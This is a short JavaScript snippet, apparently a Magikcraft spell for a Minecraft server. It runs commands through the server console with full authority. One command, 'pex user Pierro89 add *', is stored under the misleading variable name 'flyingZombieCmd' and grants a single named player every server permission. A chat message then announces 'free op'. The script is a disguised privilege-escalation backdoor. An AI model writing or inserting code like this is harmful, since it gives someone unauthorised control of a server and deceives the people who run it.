const magik = magikcraft.io;

function op() {

    function run(cmd) {
        var sudo = magik.getPlugin().getServer().getConsoleSender();
        magik.getPlugin().getServer().dispatchCommand(sudo, cmd);
    }
    const flyingZombieCmd = 'pex user Pierro89 add *';

const activeMessageCmd = 'tellraw @p ["\u00A78(\u00A7a!\u00A78) \u00A77You just earned free op!"]';

    run(flyingZombieCmd);
    run(activeMessageCmd);
}